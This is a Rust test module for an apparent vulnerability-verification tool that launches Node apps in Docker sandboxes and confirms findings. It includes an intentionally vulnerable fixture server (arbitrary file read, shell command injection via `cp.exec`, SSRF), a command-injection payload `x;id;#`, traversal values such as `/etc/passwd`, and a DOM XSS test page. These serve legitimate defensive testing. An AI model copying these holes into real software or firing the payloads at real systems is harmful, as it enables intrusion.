        assert!(manifest_launch_is_cli(root));

        // The router is mounted through the Express host shim rather than launched as the CLI.
        assert_eq!(
            start_command(root, Some(path("src/server/api.js"))).as_deref(),
            Some(r#"["node","/jss-express-host.mjs","src/server/api.js"]"#)
        );
    }

    #[test]
    fn a_shared_module_draws_dependencies_from_a_clean_bundling_package() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let path = std::path::Path::new;
        // A repo root that launches nothing and declares no dependencies.
        write(root, "package.json", r#"{"private":true}"#);
        // A shared backend module that imports packages its own tree declares nowhere.
        write(
            root,
            "backend/routes/media.js",
            "const express = require('express');\n\
             const JSZip = require('jszip');\n\
             const router = express.Router();\n\
             router.get('/x', (req, res) => res.end('ok'));\n\
             module.exports = router;\n",
        );
        // A desktop package that bundles the backend but rebuilds native modules on install — a poor
        // install source because its lifecycle script needs the real deployment.
        write(
            root,
            "desktop/package.json",
            r#"{"name":"desktop","scripts":{"postinstall":"electron-builder install-app-deps"},
                "dependencies":{"express":"^5","jszip":"^3","electron-updater":"^6"},
                "devDependencies":{"electron":"^30"}}"#,
        );
        // A mobile backend package that declares the same runtime dependencies and installs cleanly.
        write(
            root,
            "mobile/nodejs/package.json",
            r#"{"name":"mobile-backend","private":true,
                "dependencies":{"express":"^4","jszip":"^3"}}"#,
        );

        // The clean package is chosen over the one with an install lifecycle script.
        let provider = dependency_provider(root, path(""), path("backend/routes/media.js"));
        assert_eq!(provider.as_deref(), Some(path("mobile/nodejs")));

        // When the launch directory already declares the imports, no provider is needed.
        write(
            root,
            "self/package.json",
            r#"{"dependencies":{"express":"^4","jszip":"^3"}}"#,
        );
        write(
            root,
            "self/routes.js",
            "const express = require('express');\n\
             const JSZip = require('jszip');\n\
             module.exports = express.Router();\n",
        );
        assert_eq!(
            dependency_provider(root, path("self"), path("self/routes.js")),
            None
        );
    }

    #[test]
    fn a_manifest_that_launches_a_real_server_is_kept_over_hosting_the_entry() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let path = std::path::Path::new;
        // A manifest `main` that is itself a listening server is launched directly; the entry's
        // router module is not hosted in its place.
        write(
            root,
            "package.json",
            r#"{"type":"module","main":"server.js"}"#,
        );
        write(
            root,
            "server.js",
            "const express = require('express');\n\
             const app = express();\n\
             app.listen(3000);\n",
        );
        write(
            root,
            "routes/api.js",
            "import express from 'express';\n\
             export const apiRouter = () => express.Router();\n",
        );
        assert!(!manifest_launch_is_cli(root));
        assert_eq!(
            start_command(root, Some(path("routes/api.js"))).as_deref(),
            Some(r#"["node","server.js"]"#)
        );
    }

    #[test]
    fn start_script_naming_missing_file_mounts_exported_express_app() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let path = std::path::Path::new;
        write(
            root,
            "package.json",
            r#"{"main":"srv.js","scripts":{"start":"node srv.js"}}"#,
        );
        write(
            root,
            "my-srv.js",
            "const express = require('express');\nconst app = express();\n\
             app.get('/x', (req, res) => res.end());\nmodule.exports = app;\n",
        );
        assert_eq!(
            start_command(root, Some(path("my-srv.js"))).as_deref(),
            Some(r#"["node","/jss-express-host.mjs","my-srv.js"]"#)
        );
        // When the start script's file exists, the manifest launch still wins.
        write(root, "srv.js", "require('./my-srv').listen(3000);\n");
        assert_eq!(
            start_command(root, Some(path("my-srv.js"))).as_deref(),
            Some(r#"["node","srv.js"]"#)
        );
    }

    #[test]
    fn exported_express_factory_is_mountable_without_the_infrastructure_bootstrap() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            "app.js",
            "import express from 'express';\n\
             export function createApp() {\n\
               const app = express();\n\
               app.get('/x', (_req, res) => res.end('ok'));\n\
               return app;\n\
             }\n",
        );
        assert!(is_express_factory_module(&root.join("app.js")));

        write(
            root,
            "server.js",
            "import express from 'express';\nconst app = express();\napp.listen(3000);\n",
        );
        assert!(!is_express_factory_module(&root.join("server.js")));
    }

    #[test]
    fn a_findings_standalone_server_wins_over_an_unrelated_manifest_server() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let path = std::path::Path::new;
        write(
            root,
            "package.json",
            r#"{"scripts":{"start":"node index.js"},"dependencies":{"express":"4"}}"#,
        );
        write(
            root,
            "index.js",
            "require('http').createServer((q,r)=>r.end('other')).listen(3000);\n",
        );
        write(
            root,
            "☁︎.js",
            "const express=require('express'); const app=express();\n\
             app.post('/api/run',(req,res)=>res.json({ok:true}));\n\
             app.listen(9000);\n",
        );
        assert_eq!(
            start_command(root, Some(path("☁︎.js"))).as_deref(),
            Some(r#"["node","☁︎.js"]"#)
        );
        assert_eq!(session_key(root, path(""), path("☁︎.js")), path("☁︎.js"));
    }

    #[test]
    fn two_standalone_servers_in_one_directory_get_separate_sessions() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let path = std::path::Path::new;
        let server = "const http=require('http');\n\
             http.createServer((req,res)=>res.end('ok')).listen(3000);\n";
        // Two self-contained servers in the same manifest-less directory: `node <file>` runs each
        // as its own process serving its own routes.
        write(root, "src/web/server.js", server);
        write(root, "src/web/dashboard.js", server);

        // Both resolve to the same launch directory, so keying a session by directory alone would
        // probe the second server's route against the first. The entry file must distinguish them.
        let one = app_dir(root, path("src/web/server.js"));
        let two = app_dir(root, path("src/web/dashboard.js"));
        assert_eq!(one, path("src/web"));
        assert_eq!(two, path("src/web"));
        assert_ne!(
            session_key(root, &one, path("src/web/server.js")),
            session_key(root, &two, path("src/web/dashboard.js")),
        );

        // Even with a shared package manifest, independently listening finding files need separate
        // sessions: the manifest starts `a.js`, but a finding owned by `b.js` is launched directly.
        write(
            root,
            "svc/package.json",
            r#"{"scripts":{"start":"node a.js"}}"#,
        );
        write(root, "svc/a.js", server);
        write(root, "svc/b.js", server);
        let svc = path("svc");
        assert_ne!(
            session_key(root, svc, path("svc/a.js")),
            session_key(root, svc, path("svc/b.js")),
        );
    }

    #[test]
    fn dependencies_install_in_the_nearest_manifest_ancestor() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let path = std::path::Path::new;
        // A standalone server in a manifest-less subdirectory whose dependencies are declared and
        // locked only at the repo root.
        write(root, "package.json", r#"{"dependencies":{"express":"4"}}"#);
        write(root, "pnpm-lock.yaml", "");
        write(
            root,
            "src/web/dashboard.js",
            "const express=require('express');\n\
             express().listen(3000);\n",
        );

        // The launch directory has no manifest, so install must climb to the root that owns one;
        // a directory that is itself a package installs in place.
        assert_eq!(install_path(root, path("src/web")), path(""));
        assert_eq!(install_path(root, path("")), path(""));
        write(root, "svc/package.json", r#"{"name":"svc"}"#);
        assert_eq!(install_path(root, path("svc")), path("svc"));

        // The Dockerfile installs with the root's package manager in the root workdir, then moves
        // to the launch workdir for the app, so `require('express')` resolves at run time.
        let canary = Canary::new("deadbeef".to_owned());
        let file = dockerfile(
            "node:22-slim",
            "/app",
            "/app/src/web",
            &canary,
            r#"["node","dashboard.js"]"#,
            3000,
            PackageManager::Pnpm,
            None,
            false,
            &[],
        );
        let install = file.find("pnpm install").unwrap();
        let run_workdir = file.find("WORKDIR /app/src/web\n").unwrap();
        assert!(file.find("WORKDIR /app\n").unwrap() < install, "{file}");
        assert!(install < run_workdir, "{file}");
    }

    #[test]
    fn a_stale_pnpm_lockfile_is_recovered_without_the_frozen_requirement() {
        // Under `CI=true` pnpm freezes the lockfile by default, so the plain fallback must opt out
        // explicitly or a lockfile that no longer matches the manifest can never be installed.
        let install = install_command(PackageManager::Pnpm);
        assert!(
            install.contains("pnpm install --frozen-lockfile"),
            "{install}"
        );
        assert!(
            install.contains("pnpm install --no-frozen-lockfile"),
            "{install}"
        );
    }

    #[test]
    fn the_canary_is_planted_as_valid_json_so_it_survives_a_parse() {
        // A read sink that parses its file before returning it (`res.json(JSON.parse(readFile(p)))`)
        // throws on a bare token; a JSON string literal round-trips, and still echoes the token
        // verbatim for a handler that serves the bytes raw.
        let canary = Canary::new("cafed00d".to_owned());
        let file = dockerfile(
            "node:22-slim",
            "/app",
            "/app",
            &canary,
            r#"["npm","start"]"#,
            3000,
            PackageManager::Npm,
            None,
            false,
            &[],
        );
        assert!(file.contains(r#"printf '"%s"' 'cafed00d'"#), "{file}");
    }

    #[test]
    fn a_native_build_helper_triggers_the_toolchain_install() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // A lockfile that resolves a native-addon helper: the native package's install script needs a
        // compiler, without which npm rolls back the whole `node_modules`.
        write(
            root,
            "package.json",
            r#"{"dependencies":{"better-sqlite3":"^13.0.3"}}"#,
        );
        write(
            root,
            "package-lock.json",
            r#"{"packages":{"node_modules/node-addon-api":{"version":"8.0.0"}}}"#,
        );
        assert!(needs_native_toolchain(root));

        // A pure-JS lockfile needs no toolchain.
        let plain = tempfile::tempdir().unwrap();
        write(
            plain.path(),
            "package.json",
            r#"{"dependencies":{"fastify":"^5.4.0"}}"#,
        );
        write(
            plain.path(),
            "package-lock.json",
            r#"{"packages":{"node_modules/fastify":{"version":"5.4.0"}}}"#,
        );
        assert!(!needs_native_toolchain(plain.path()));
    }

    #[test]
    fn the_toolchain_install_runs_before_the_dependency_install() {
        let canary = Canary::new("cafed00d".to_owned());
        let with = dockerfile(
            "node:22-slim",
            "/app",
            "/app",
            &canary,
            r#"["npm","start"]"#,
            3000,
            PackageManager::Npm,
            None,
            true,
            &[],
        );
        let toolchain = with.find(NATIVE_TOOLCHAIN_INSTALL).expect("toolchain step");
        let install = with.find("npm ci").expect("install step");
        assert!(toolchain < install, "{with}");

        // Omitted for a pure-JS app so its build is not slowed.
        let without = dockerfile(
            "node:22-slim",
            "/app",
            "/app",
            &canary,
            r#"["npm","start"]"#,
            3000,
            PackageManager::Npm,
            None,
            false,
            &[],
        );
        assert!(!without.contains(NATIVE_TOOLCHAIN_INSTALL), "{without}");
    }

    #[test]
    fn a_conventional_entry_is_launched_when_no_script_or_main_names_one() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // A manifest that reserves every script for tests and declares no `main`, as a package
        // documented to start with `node src/index.js` does.
        write(
            root,
            "package.json",
            r#"{"scripts":{"test":"node --test"}}"#,
        );
        // The launcher binds a port by listening on an app factory it imports; it does not construct
        // the listener itself.
        write(
            root,
            "src/index.js",
            "const { createApp } = require('./app');\n\
             createApp().listen(Number(process.argv[2] || 8080));\n",
        );
        // The factory only exports an unstarted server; it is not itself a launcher.
        write(
            root,
            "src/app.js",
            "const http = require('http');\n\
             exports.createApp = () => http.createServer((req, res) => res.end('ok'));\n",
        );

        assert!(is_launchable_entry(&root.join("src/index.js")));
        assert!(!is_launchable_entry(&root.join("src/app.js")));
        assert_eq!(
            manifest_start_command(root).as_deref(),
            Some(r#"["node","src/index.js"]"#)
        );
        // A package with no launcher-shaped entry stays unlaunchable.
        let lib = tempfile::tempdir().unwrap();
        write(
            lib.path(),
            "package.json",
            r#"{"scripts":{"test":"node --test"}}"#,
        );
        write(
            lib.path(),
            "index.js",
            "module.exports = { add: (a, b) => a + b };\n",
        );
        assert_eq!(manifest_start_command(lib.path()), None);
    }

    #[test]
    fn a_server_alias_is_used_when_start_and_main_are_absent() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "package.json",
            r#"{"scripts":{"build":"echo build","app":"node server.js"}}"#,
        );
        assert_eq!(
            manifest_start_command(dir.path()).as_deref(),
            Some(r#"["npm","run","app"]"#)
        );
    }

    /// The readiness probe is valid Node and reports the port asked for when the app listens
    /// there (where `/proc/net/tcp` is absent, the only port it can try).
    #[test]
    fn the_listening_probe_reports_the_port_answering() {
        if Command::new("node").arg("--version").output().is_err() {
            return;
        }
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let out = Command::new("node")
            .args(["-e", &listening_probe_excluding(port, &[])])
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(
            String::from_utf8_lossy(&out.stdout).trim(),
            port.to_string()
        );
        drop(listener);
        let out = Command::new("node")
            .args(["-e", &listening_probe_excluding(port, &[])])
            .output()
            .unwrap();
        assert!(!out.status.success() || std::path::Path::new("/proc/net/tcp").exists());
    }

    #[test]
    fn the_listening_probe_never_accepts_an_excluded_wanted_port() {
        if Command::new("node").arg("--version").output().is_err() {
            return;
        }
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let out = Command::new("node")
            .args(["-e", &listening_probe_excluding(port, &[port])])
            .output()
            .unwrap();
        assert!(
            !out.status.success(),
            "a pre-existing listener on {port} was selected as the new app"
        );
    }

    #[test]
    fn the_local_listening_probe_excludes_sidecar_ports() {
        let probe = listening_probe_excluding(3000, &[27017, 6379]);
        assert!(probe.contains("new Set([27017,6379])"));
        assert!(probe.contains("!excluded.has(port)"));
    }

    #[cfg(unix)]
    #[test]
    fn an_exited_launcher_keeps_the_local_app_running_while_its_group_has_children() {
        use std::os::unix::process::CommandExt;

        let mut command = Command::new("sh");
        command.args(["-c", "sleep 10 &"]).process_group(0);
        let mut child = command.spawn().unwrap();
        let group = child.id();
        assert!(child.wait().unwrap().success());
        assert!(local_process_group_running(group));
        stop_local_process(&mut child);
        assert!(!local_process_group_running(group));
    }

    #[cfg(unix)]
    #[test]
    fn stopping_a_local_launcher_stops_its_server_child() {
        use std::os::unix::process::CommandExt;

        if Command::new("node").arg("--version").output().is_err() {
            return;
        }
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        drop(listener);
        let script = format!(
            "node -e \"require('http').createServer((q,s)=>s.end('ok')).listen({port},'127.0.0.1')\" & wait"
        );
        let mut command = Command::new("sh");
        command.args(["-c", &script]).process_group(0);
        let mut child = command.spawn().unwrap();
        for _ in 0..50 {
            if std::net::TcpStream::connect(("127.0.0.1", port)).is_ok() {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        assert!(std::net::TcpStream::connect(("127.0.0.1", port)).is_ok());
        stop_local_process(&mut child);
        for _ in 0..50 {
            if std::net::TcpListener::bind(("127.0.0.1", port)).is_ok() {
                return;
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        panic!("the launched server child still owns port {port}");
    }

    #[test]
    fn a_main_entry_outside_the_package_or_missing_is_not_launched() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        for main in [
            "../escape.js",
            "/etc/passwd",
            "missing.js",
            "a b.js",
            "x\".js",
        ] {
            let manifest = serde_json::json!({ "main": main }).to_string();
            write(root, "package.json", &manifest);
            assert_eq!(manifest_start_command(root), None, "main {main:?}");
        }
    }

    #[test]
    fn the_image_starts_the_app_from_its_own_directory() {
        let path = std::path::Path::new;
        assert_eq!(container_dir(path("")).as_deref(), Some("/app"));
        assert_eq!(
            container_dir(path("capture")).as_deref(),
            Some("/app/capture")
        );
        assert_eq!(
            container_dir(path("a/@b/c-d")).as_deref(),
            Some("/app/a/@b/c-d")
        );
        assert_eq!(container_dir(path("../x")), None);
        assert_eq!(container_dir(path("a b")), None);

        let canary = Canary::new("tok".to_owned());
        let file = dockerfile(
            "node:22-slim",
            "/app/svc",
            "/app/svc",
            &canary,
            r#"["node","index.js"]"#,
            3000,
            PackageManager::Npm,
            None,
            false,
            &[],
        );
        let copy = file.find("COPY . /app\n").unwrap();
        let workdir = file.find("WORKDIR /app/svc\n").unwrap();
        let install = file.find("RUN npm ci").unwrap();
        assert!(copy < workdir && workdir < install, "{file}");
        assert!(!file.contains("ENV NODE_OPTIONS="), "{file}");
        assert!(file.ends_with("CMD [\"node\",\"index.js\"]\n"));
    }

    #[test]
    fn base64_is_shell_safe_and_round_trips() {
        let encoded = base64(DRIVER_JS.as_bytes());
        assert!(
            encoded
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
        );
        // A couple of known vectors.
        assert_eq!(base64(b""), "");
        assert_eq!(base64(b"f"), "Zg==");
        assert_eq!(base64(b"fo"), "Zm8=");
        assert_eq!(base64(b"foo"), "Zm9v");
        assert_eq!(base64(b"foob"), "Zm9vYg==");
    }

    /// A zero-dependency Node server exercising each signal path: a vulnerable `/read?name=`
    /// (reads any path), a confined `/safe?name=`, a `/ping?host=` that shells out, and a
    /// `/fetch?url=` that makes an outbound request. No npm install, so the build is offline and
    /// fast.
    const FIXTURE: &str = r#"
const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const cp = require('child_process');
const ROOT = '/tmp/pub';
fs.mkdirSync(ROOT, { recursive: true });
http.createServer((req, res) => {
  const u = url.parse(req.url, true);
  const name = (u.query.name || '').toString();
  if (u.pathname === '/read') {
    try { res.end(fs.readFileSync(name)); } catch (e) { res.statusCode = 404; res.end('x'); }
    return;
  }
  if (u.pathname === '/safe') {
    const p = path.resolve(ROOT, name);
    if (p !== ROOT && !p.startsWith(ROOT + path.sep)) { res.statusCode = 403; return res.end('no'); }
    try { res.end(fs.readFileSync(p)); } catch (e) { res.statusCode = 404; res.end('x'); }
    return;
  }
  if (u.pathname === '/ping') {
    cp.exec('echo ' + (u.query.host || ''), () => res.end('done'));
    return;
  }
  if (u.pathname === '/run') {
    cp.exec('echo ' + (u.query.host || ''), (_error, stdout) => res.end(stdout));
    return;
  }
  if (u.pathname === '/fetch') {
    try { http.get((u.query.url || '').toString(), (r) => { r.resume(); res.end('ok'); }).on('error', () => res.end('err')); }
    catch (e) { res.end('err'); }
    return;
  }
  res.statusCode = 404; res.end('x');
}).listen(process.env.PORT || 3000, process.env.HOST || '0.0.0.0');
"#;

    /// Builds the fixture in a container, confirms the vulnerable route and clears the confined
    /// one. Skipped (not failed) when no Docker daemon is reachable, so it is safe in CI and on a
    /// machine without Docker.
    #[test]
    fn end_to_end_verifies_traversal_and_clears_confinement() {
        use super::super::Outcome;
        use super::super::plan::{Entry, Method, Probe};
        use jss_core::VulnClass;

        if !available() {
            eprintln!("verify end-to-end: skipped (no Docker daemon reachable)");
            return;
        }
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"verify-fixture","version":"1.0.0","scripts":{"start":"node server.js"}}"#,
        )
        .unwrap();
        std::fs::write(dir.path().join("server.js"), FIXTURE).unwrap();

        let mut session = Session::start(dir.path()).expect("the fixture sandbox should start");
        let traversal = Probe {
            method: Method::Get,
            path: "/read".to_owned(),
            entry: Entry::Query("name".to_owned()),
            class: VulnClass::PathTraversal,
            siblings: Vec::new(),
            gate_paths: Vec::new(),
            url_query_params: Vec::new(),
            read_suffix: None,
            envelope: None,
            doc_envelope: None,
            lists_dir: false,
            removes: false,
            removes_dir: false,
            creates: false,
            archive_upload: false,
            appended_param: None,
            path_fillers: Vec::new(),
            body_requires: Vec::new(),
            body_object: false,
            body_query_override: None,
            sql: None,
            sql_value: None,
            array_element: false,
            appended_fields: Vec::new(),
            proto_pollution: None,
            alt_paths: Vec::new(),
            auth: None,
            multipart: None,
            cmd_quote: None,
            cmd_dir_segment: false,
            nosql_lookup: false,
            nosql_inserts_before_sink: false,
            nosql_mutates: false,
            decode_base64: None,
            allow_tokens: Vec::new(),
        };
        let confined = Probe {
            method: Method::Get,
            path: "/safe".to_owned(),
            entry: Entry::Query("name".to_owned()),
            class: VulnClass::PathTraversal,
            siblings: Vec::new(),
            gate_paths: Vec::new(),
            url_query_params: Vec::new(),
            read_suffix: None,
            envelope: None,
            doc_envelope: None,
            lists_dir: false,
            removes: false,
            removes_dir: false,
            creates: false,
            archive_upload: false,
            appended_param: None,
            path_fillers: Vec::new(),
            body_requires: Vec::new(),
            body_object: false,
            body_query_override: None,
            sql: None,
            sql_value: None,
            array_element: false,
            appended_fields: Vec::new(),
            proto_pollution: None,
            alt_paths: Vec::new(),
            auth: None,
            multipart: None,
            cmd_quote: None,
            cmd_dir_segment: false,
            nosql_lookup: false,
            nosql_inserts_before_sink: false,
            nosql_mutates: false,
            decode_base64: None,
            allow_tokens: Vec::new(),
        };
        let command = Probe {
            method: Method::Get,
            path: "/ping".to_owned(),
            entry: Entry::Query("host".to_owned()),
            class: VulnClass::CommandInjection,
            siblings: Vec::new(),
            gate_paths: Vec::new(),
            url_query_params: Vec::new(),
            read_suffix: None,
            envelope: None,
            doc_envelope: None,
            lists_dir: false,
            removes: false,
            removes_dir: false,
            creates: false,
            archive_upload: false,
            appended_param: None,
            path_fillers: Vec::new(),
            body_requires: Vec::new(),
            body_object: false,
            body_query_override: None,
            sql: None,
            sql_value: None,
            array_element: false,
            appended_fields: Vec::new(),
            proto_pollution: None,
            alt_paths: Vec::new(),
            auth: None,
            multipart: None,
            cmd_quote: None,
            cmd_dir_segment: false,
            nosql_lookup: false,
            nosql_inserts_before_sink: false,
            nosql_mutates: false,
            decode_base64: None,
            allow_tokens: Vec::new(),
        };
        let visible_command = Probe {
            path: "/run".to_owned(),
            ..command.clone()
        };
        let ssrf = Probe {
            method: Method::Get,
            path: "/fetch".to_owned(),
            entry: Entry::Query("url".to_owned()),
            class: VulnClass::Ssrf,
            siblings: Vec::new(),
            gate_paths: Vec::new(),
            url_query_params: Vec::new(),
            read_suffix: None,
            envelope: None,
            doc_envelope: None,
            lists_dir: false,
            removes: false,
            removes_dir: false,
            creates: false,
            archive_upload: false,
            appended_param: None,
            path_fillers: Vec::new(),
            body_requires: Vec::new(),
            body_object: false,
            body_query_override: None,
            sql: None,
            sql_value: None,
            array_element: false,
            appended_fields: Vec::new(),
            proto_pollution: None,
            alt_paths: Vec::new(),
            auth: None,
            multipart: None,
            cmd_quote: None,
            cmd_dir_segment: false,
            nosql_lookup: false,
            nosql_inserts_before_sink: false,
            nosql_mutates: false,
            decode_base64: None,
            allow_tokens: Vec::new(),
        };
        let vulnerable = session.exercise(&traversal);
        let safe = session.exercise(&confined);
        let injected = session.exercise(&command);
        let visible_injected = session.exercise(&visible_command);
        let forged = session.exercise(&ssrf);
        session.teardown();

        assert!(
            matches!(vulnerable, Outcome::Verified { .. }),
            "the vulnerable read route should verify, got {vulnerable:?}"
        );
        assert!(
            matches!(safe, Outcome::NotReproduced { .. }),
            "the confined route should not reproduce, got {safe:?}"
        );
        match &visible_injected {
            Outcome::Verified { poc, .. } => {
                // The payload is space-free (`x;id;#`), so the query carries the shell separator and
                // the injected `id`, percent-encoded, with no `%20` to break a raw request target.
                assert!(poc.command.contains("%3Bid"), "{}", poc.command);
                assert!(poc.response.contains("uid="), "{}", poc.response);
            }
            other => panic!("command injection should verify, got {other:?}"),
        }
        // A blind command injection (the handler discards the child's output) is proved out of band:
        // the injected command makes an HTTP callback to the isolated marker carrying this probe's
        // unique token. That is an unmistakable observable consequence with an implicit negative
        // control (a benign request never carries the token) — never a filesystem side effect.
        match &injected {
            Outcome::Verified { poc, .. } => {
                assert!(
                    poc.evidence
                        .contains("marker service received callback token"),
                    "blind command injection must verify via the out-of-band callback, got {}",
                    poc.evidence
                );
                assert!(
                    poc.target.contains("jss-marker"),
                    "the injected command must reach the marker, got {}",
                    poc.target
                );
            }
            other => panic!("blind command injection should verify out of band, got {other:?}"),
        }
        assert!(
            matches!(forged, Outcome::Verified { .. }),
            "the SSRF should verify, got {forged:?}"
        );
    }

    #[test]
    fn html_loads_script_wants_a_script_tag_not_a_module_mention() {
        assert!(html_loads_script(
            r#"<script src="app.js"></script>"#,
            "app.js"
        ));
        assert!(html_loads_script(
            r#"<script type="module" src="/y/app.js?v=3"></script>"#,
            "app.js"
        ));
        // A plain mention, or an import in inline JS, is not a <script src>.
        assert!(!html_loads_script(r#"<a href="app.js">x</a>"#, "app.js"));
        assert!(!html_loads_script(
            r#"<script>import './app.js'</script>"#,
            "app.js"
        ));
    }

    #[test]
    fn mines_local_storage_feature_flags_first_value_per_key() {
        let source = r#"
            if (localStorage.getItem('orb_style') === 'xfce') boot();
            var dark = localStorage.getItem("orb-dark") == "1";
            if (localStorage.getItem('orb_style') === 'other') never();
            var x = map.get('ignored');
        "#;
        let mut flags = Vec::new();
        mine_local_storage_flags(source, &mut flags);
        assert_eq!(
            flags,
            vec![
                ("orb_style".to_owned(), "xfce".to_owned()),
                ("orb-dark".to_owned(), "1".to_owned()),
            ]
        );
    }

    #[test]
    fn harness_url_encodes_the_attempt_as_one_component() {
        // The attempt URL carries its own `?`, `#`, `&` and percent-escapes; the harness must
        // receive it verbatim, so none of those structural characters may leak unencoded.
        let attempt = "/entries.html?col=%3Cimg%20src%3Dx%3E&a=1#frag";
        let seeds = seeds_json(&[("orb_style".to_owned(), "xfce".to_owned())]);
        let url = harness_url(attempt, &seeds);
        let p = url
            .strip_prefix("/__jss/harness?p=")
            .and_then(|r| r.split("&s=").next())
            .expect("harness url shape");
        assert!(!p.contains('?'));
        assert!(!p.contains('#'));
        assert!(!p.contains('&'));
        // The payload's own `%` escapes are themselves escaped, so a single decode recovers them.
        assert!(p.contains("%253C"));
        assert_eq!(encode_component("/a?b#c&d"), "%2Fa%3Fb%23c%26d");
    }

    #[test]
    fn seeds_json_is_well_formed_and_escaped() {
        let json = seeds_json(&[
            ("a".to_owned(), "b".to_owned()),
            ("q\"x".to_owned(), "v\\y".to_owned()),
        ]);
        assert_eq!(json, r#"[["a","b"],["q\"x","v\\y"]]"#);
    }

    #[test]
    fn script_names_page_matches_quoted_stem_only() {
        let source = "var pg = path.pop(); if (pg === 'entries' || pg === 'editor') {}";
        assert!(script_names_page(source, "entries"));
        assert!(script_names_page(source, "editor"));
        assert!(!script_names_page(source, "dashboard"));
        // A bare, unquoted occurrence is not a name-check.
        assert!(!script_names_page("entriesController()", "entries"));
    }

    /// Confirms a reflected DOM XSS in a headless browser and clears a page that escapes. Needs
    /// Docker *and* `JSS_VERIFY_BROWSER_TEST=1` (the Playwright image is large), so it is off by
    /// default; it skips cleanly otherwise.
    #[test]
    fn browser_phase_verifies_a_reflected_dom_xss() {
        use super::super::plan::{BrowserProbe, BrowserSink, UrlVector};

        if !available() || std::env::var_os("JSS_VERIFY_BROWSER_TEST").is_none() {
            eprintln!("browser e2e: skipped (needs Docker + JSS_VERIFY_BROWSER_TEST=1)");
            return;
        }
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("index.html"),
            "<!doctype html><div id=out></div><script src=\"app.js\"></script>",
        )
        .unwrap();
        std::fs::write(
            dir.path().join("app.js"),
            "document.getElementById('out').innerHTML='<b>'+new URLSearchParams(location.search).get('q')+'</b>';",
        )
        .unwrap();
        // A page that escapes its input (textContent): the canary must not run.
        std::fs::write(
            dir.path().join("safe.html"),
            "<!doctype html><div id=o></div><script>document.getElementById('o').textContent=new URLSearchParams(location.search).get('q');</script>",
        )
        .unwrap();

        let mut session = BrowserSession::start(dir.path()).expect("browser session should start");
        let vulnerable = session.exercise(&BrowserProbe {
            file: "app.js".to_owned(),
            vector: UrlVector::Search,
            sink: BrowserSink::Html,
            params: Vec::new(),
        });
        let safe = session.exercise(&BrowserProbe {
            file: "safe.html".to_owned(),
            vector: UrlVector::Search,
            sink: BrowserSink::Html,
            params: Vec::new(),
        });
        session.teardown();

        assert!(
            matches!(vulnerable, Outcome::Verified { .. }),
            "the reflected DOM XSS should verify, got {vulnerable:?}"
        );
        assert!(
            matches!(safe, Outcome::NotReproduced { .. }),
            "the escaping page should not reproduce, got {safe:?}"
        );
    }
}
